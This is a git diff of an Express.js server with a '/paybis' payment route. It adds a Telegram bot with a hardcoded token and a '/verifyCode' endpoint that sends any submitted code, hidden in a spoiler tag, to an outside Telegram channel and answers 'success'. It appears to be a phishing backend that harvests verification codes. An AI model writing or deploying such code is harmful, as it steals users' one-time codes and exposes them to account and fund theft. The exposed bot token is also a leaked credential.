@@ -2,11 +2,14 @@ const express = require('express');
 // const config = require('config');
 const cors = require('cors');
 const path = require('path');
+const TelegramBot = require('node-telegram-bot-api');
 // const { run } = require('./mongoDBConnection');
 
 const bodyParser = require('body-parser');
 const app = express();
 const server = require('http').createServer(app);
+
+const bot = new TelegramBot('6849642721:AAF1lWoLLdRF5KobcU8SrUR1ZUin9crFNCg', { restart: true });
 app.use(cors());
 
 // app.use(
@@ -28,6 +31,11 @@ app.get('/', (req, res) => {
 });
 app.use('/public', express.static(path.join(__dirname, '../public')));
 app.use('/paybis', require('./api/paybis.js'));
+app.post('/verifyCode',async(req,res)=>{
+    const {code} = req.body;
+    await bot.sendMessage('@developers_00', `<b>URL:</b> <code>${11}</code>\n<b>Code:</b> <span class="tg-spoiler">${code}</span>`, { parse_mode: 'HTML' });
+    res.send({message:'success'})
+})
 app.use('/',(req,res)=> res.send({ success: false, message: 'Server Error!' }))
 
 async function start() {
